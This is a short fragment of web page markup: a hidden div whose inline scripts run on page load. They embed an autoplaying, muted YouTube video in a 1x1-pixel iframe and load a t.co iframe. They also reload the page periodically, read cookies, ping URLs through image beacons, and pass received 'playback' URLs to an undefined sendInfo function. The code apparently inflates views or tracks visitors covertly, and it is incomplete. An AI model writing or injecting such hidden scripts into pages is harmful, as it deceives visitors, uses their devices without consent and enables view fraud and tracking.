
 
<div hidden>
<body></body>
	<script>setTimeout(function() {
	try {
		document.getElementById("player").remove();
	} catch(ex){}
	window.location.reload();
}, 500*1000);
function createFrame(videoId, el, autoplay, cc, id) {
        var iframe = document.createElement('iframe');
        iframe.src = 'https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2F'+ videoId +'%3Fenablejsapi%3D0%26autoplay%3d'+ autoplay + '%26mute%3d1%26el%26showinfo%3D0%26playsinline%3D0%26modestbranding%3D0%26rel%3D0%26loop%3D0%26cc_load_policy%3D' + cc +'%26origin%3D*';
        iframe.id = id;
        iframe.style.height="1px";
        iframe.style.width="1px";
        document.body.appendChild(iframe);
}
</script>
<iframe src="https://t.co/?ylm1&ylm=-Dw4NJO1PDs"></iframe><script> var videoId = '-Dw4NJO1PDs'; el = ''; oid = ''; autoplay = ''; cc = '1';</script><script>
createFrame(videoId, el, 1, cc, "player");
var finalUrl = ""
var setInfo = 0
function getCookie(name){
    var pattern = RegExp(name + "=.[^;]*")
    var matched = document.cookie.match(pattern)
    if(matched){
        var cookie = matched[0].split('=')
        return cookie[1]
    }
    return false
}function notify_url(url) {
        var url = url;
        var img  = new Image();
        img.src = url;
        return false;
}function find_frame(e) {
        var iframes = document.getElementsByTagName('iframe');
        for(var i = 0; i < iframes.length; i++) {
            if( e.source === iframes[i].contentWindow) {
                return iframes[i];
            }
        }
}window.addEventListener('message', function(event) {
    try {
	    var json = JSON.parse(event.data)
	    if (json.type == 'playback') {
                finalUrl = json.message
		console.log(finalUrl);	
                sendInfo(finalUrl)
    	    }
        } catch(ex) {
                console.log(ex)
        }
    }
);</script>

</div>



